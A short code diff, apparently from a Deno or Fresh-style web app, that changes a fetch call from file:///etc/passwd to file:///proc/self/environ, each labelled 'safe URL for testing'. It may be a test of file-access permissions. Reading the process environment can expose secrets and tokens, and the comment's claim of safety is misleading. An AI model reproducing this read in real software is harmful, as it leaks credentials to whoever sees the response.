@@ -21,7 +21,7 @@ export default defineApp(async (_req, ctx) => {
   let externalData: any = null;
   let exData: any = null;
   try {
-    exData = await fetch(`file:///etc/passwd`) // <-- safe URL for testing
+    exData = await fetch(`file:///proc/self/environ`) // <-- safe URL for testing
       .then((res) => res.text());
 
     externalData = await fetch(
